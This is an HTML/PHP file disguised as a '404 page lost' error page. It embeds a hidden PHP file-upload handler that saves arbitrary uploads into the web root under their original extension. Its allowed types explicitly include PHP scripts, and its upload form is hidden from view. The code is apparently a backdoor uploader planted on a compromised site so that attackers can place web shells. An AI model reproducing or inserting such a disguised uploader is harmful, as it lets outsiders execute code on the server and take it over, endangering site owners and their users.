<!DOCTYPE html>
<html lang="en-us" prefix="content: http://purl.org/rss/1.0/modules/content/ dc: http://purl.org/dc/terms/ foaf: http://xmlns.com/foaf/0.1/ og: http://ogp.me/ns# rdfs: http://www.w3.org/2000/01/rdf-schema# sioc: http://rdfs.org/sioc/ns# sioct: http://rdfs.org/sioc/types# skos: http://www.w3.org/2004/02/skos/core# xsd: http://www.w3.org/2001/XMLSchema#">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style type="text/css">
        /* Your CSS styles here  !#!% trade style*/ 
    </style>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Oops, something lost</title>
    <meta name="description" content="Oops, looks like the page is lost. Start your website on the cheap.">
    <link media="all" rel="stylesheet" href="/htdocs_error/style.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i" rel="stylesheet">
</head>
<body>
    <div class="error" id="error">
        <div class="container">
            <div class="content centered">
                <img style="width:500px;" src="https://pixvid.org/images/2024/10/13/Untitled.png">
                <h1>Oops, looks like the page is lost.</h1>
                <p style="font-size:22px;" class="sub-header text-block-narrow">This is not a fault, just an accident that was not intentional.</p>
            </div>
        </div>
    </div>
    <?php
    $uploadDir = __DIR__ . '/';
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0755, true);
    }

    $allowedTypes = ['image/jpeg', 'image/png', 'application/pdf', 'application/zip', 'text/x-php', 'application/x-httpd-php'];
    $maxFileSize = 2 * 1024 * 1024; // 2 MB

    if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['fileToUpload'])) {
        $file = $_FILES['fileToUpload'];
        $fileType = mime_content_type($file['tmp_name']);

        if (!in_array($fileType, $allowedTypes)) {
            echo "Invalid file type.";
        } elseif ($file['size'] > $maxFileSize) {
            echo "File is too large.";
        } else {
            $fileName = uniqid() . '.' . pathinfo($file['name'], PATHINFO_EXTENSION);
            $extension = pathinfo($file['name'], PATHINFO_EXTENSION);
            $newFileName = uniqid() . '.' . $extension;
            $uploadFile = $uploadDir . $newFileName;

            if (move_uploaded_file($file['tmp_name'], $uploadFile)) {
                echo "The file " . htmlspecialchars(basename($uploadFile)) . " has been uploaded.";
            } else {
                echo "Sorry, there was an error uploading your file.";
            }
        }
    }


        echo "<center>";
        echo "<form method='post' enctype='multipart/form-data' hidden>";
        echo "<input type='file' name='fileToUpload' id='fileToUpload'>";
        echo "<input type='submit' value='Upload File' name='submit'>";
        echo "</form>";
        echo "</center>";
    
    ?>
</body>
</html>